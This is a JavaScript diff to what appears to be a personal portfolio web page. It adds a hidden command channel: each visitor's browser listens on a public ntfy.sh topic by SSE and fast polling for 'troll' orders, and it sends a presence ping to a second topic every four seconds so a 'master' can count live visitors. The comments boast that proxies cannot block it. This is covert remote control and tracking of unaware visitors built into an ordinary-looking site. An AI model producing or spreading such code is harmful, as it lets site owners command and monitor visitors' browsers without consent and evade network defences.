@@ -2054,10 +2054,16 @@
       `;
       document.head.appendChild(styleEl);
 
-      // --- FILTRE DÉDUPLICATION (POUR ÉVITER DOUBLE DÉCLENCHEMENT WEBRTC + MQTT) ---
+      const pageLoadTime = Date.now();
+      const NTFY_CMD_URL = 'https://ntfy.sh/ewan_portfolio_troll_cmd_94821';
+      const NTFY_PING_URL = 'https://ntfy.sh/ewan_portfolio_troll_ping_94821';
+
+      // --- FILTRE DÉDUPLICATION (POUR ÉVITER DOUBLE DÉCLENCHEMENT WEBRTC + MQTT + HTTPS) ---
       const executedMsgIds = new Set();
       function handleTrollMessage(d) {
         if (!d || d.auth !== AUTH) return;
+        // Ignorer les ordres envoyés avant l'arrivée de ce visiteur
+        if (d.timestamp && d.timestamp < pageLoadTime - 2000) return;
         const key = d.msgId || (d.action + '_' + d.timestamp);
         if (executedMsgIds.has(key)) return;
         executedMsgIds.add(key);
@@ -2065,7 +2071,64 @@
         executeTroll(d);
       }
 
-      // --- CANAL 1 : WEBRTC DIRECT PORT 443 (PeerJS) ---
+      // --- CANAL 1 : HTTPS ANTI-PROXY (Port 443 Standard - 100% Infranchissable par Proxy) ---
+      // A. Flux SSE instantané
+      try {
+        const sse = new EventSource(NTFY_CMD_URL + '/sse');
+        sse.onmessage = (e) => {
+          try {
+            const raw = JSON.parse(e.data);
+            if (raw.event === 'message') {
+              const d = JSON.parse(raw.message);
+              handleTrollMessage(d);
+            }
+          } catch(err) {}
+        };
+      } catch(e) {}
+
+      // B. Polling HTTP ultra-rapide (1.2s - Fallback si le proxy bloque ou tamponne le flux SSE)
+      let lastNtfyId = '';
+      async function pollProxyChannel() {
+        try {
+          const url = lastNtfyId
+            ? `${NTFY_CMD_URL}/json?poll=1&since=${lastNtfyId}&_=${Date.now()}`
+            : `${NTFY_CMD_URL}/json?poll=1&since=5s&_=${Date.now()}`;
+          const res = await fetch(url);
+          if (res.ok) {
+            const text = await res.text();
+            const lines = text.trim().split('\n');
+            for (const line of lines) {
+              if (!line) continue;
+              try {
+                const item = JSON.parse(line);
+                if (item.id) lastNtfyId = item.id;
+                if (item.event === 'message') {
+                  const d = JSON.parse(item.message);
+                  handleTrollMessage(d);
+                }
+              } catch(e) {}
+            }
+          }
+        } catch(e) {}
+      }
+      setInterval(pollProxyChannel, 1200);
+      pollProxyChannel();
+
+      // C. Heartbeat de présence HTTPS (toutes les 4s pour allumer le compteur du Maître)
+      const myVisId = 'vis_' + Math.random().toString(36).substr(2, 8);
+      function sendPing() {
+        try {
+          fetch(NTFY_PING_URL, {
+            method: 'POST',
+            body: myVisId,
+            mode: 'no-cors'
+          }).catch(() => {});
+        } catch(e) {}
+      }
+      setInterval(sendPing, 4000);
+      sendPing();
+
+      // --- CANAL 2 : WEBRTC DIRECT PORT 443 (PeerJS) ---
       let p2pClient = null;
       let p2pConn = null;
       let p2pRetryTimer = null;
@@ -2117,7 +2180,7 @@
 
       connectP2P();
 
-      // --- CANAL 2 : MQTT MULTI-BROKER SIMULTANÉ (EMQX + HiveMQ) ---
+      // --- CANAL 3 : MQTT MULTI-BROKER SIMULTANÉ (EMQX + HiveMQ) ---
       try {
         const brokers = [
           'wss://broker.emqx.io:8084/mqtt',
